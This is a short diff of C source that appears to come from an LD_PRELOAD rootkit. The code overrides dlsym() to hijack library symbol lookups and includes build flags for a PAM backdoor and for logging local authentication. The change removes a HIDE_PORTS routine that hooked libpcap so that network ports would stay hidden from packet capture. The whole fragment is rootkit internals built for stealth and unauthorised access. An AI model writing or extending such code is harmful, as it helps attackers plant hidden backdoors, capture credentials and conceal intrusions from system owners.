@@ -45,23 +45,6 @@ void get_libpam_symbol(const char *symbol, void **funcptr){
 }
 #endif
 
-#ifdef HIDE_PORTS
-void get_libpcap_symbol(const char *symbol, void **funcptr){
-    if(funcptr != NULL) return;
-
-    void *libpcap_handle = dlopen(LIBPCAP_PATH, RTLD_LAZY);
-    char *curcall;
-    for(int i = 0; i < LIBPCAP_CALLS_SIZE; i++){
-        curcall = libpcap_calls[i];
-
-        if(!strncmp(curcall, symbol, strlen(curcall))){
-            *funcptr = o_dlsym(libpcap_handle, symbol);
-            break;
-        }
-    }
-}
-#endif
-
 void locate_dlsym(void){
     if(o_dlsym != NULL) return;
 
@@ -102,9 +85,6 @@ void *dlsym(void *handle, const char *symbol){
 
 #if defined(USE_PAM_BD) || defined(LOG_LOCAL_AUTH)
     get_libpam_symbol(symbol, &ptr);
-#endif
-#ifdef HIDE_PORTS
-    get_libpcap_symbol(symbol, &ptr);
 #endif
 
     if(ptr == NULL)
